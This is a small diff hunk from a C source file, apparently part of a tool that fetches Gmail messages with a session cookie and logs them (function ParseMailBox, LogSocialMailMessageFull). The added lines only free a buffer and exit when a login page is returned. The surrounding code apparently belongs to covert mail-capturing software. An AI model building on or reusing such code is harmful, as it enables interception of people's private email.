@@ -79,6 +79,10 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 		// Verifica che non mi abbia risposto con la pagina di login
 		if (r_buffer_inner && response_len>0 && strstr((char *)r_buffer_inner, "Received: "))
 			LogSocialMailMessageFull(MAIL_GMAIL, r_buffer_inner, response_len, is_incoming);
+		else {
+			SAFE_FREE(r_buffer_inner);
+			break;
+		}
 
 		/*
 		// Parsa il contenuto della mail
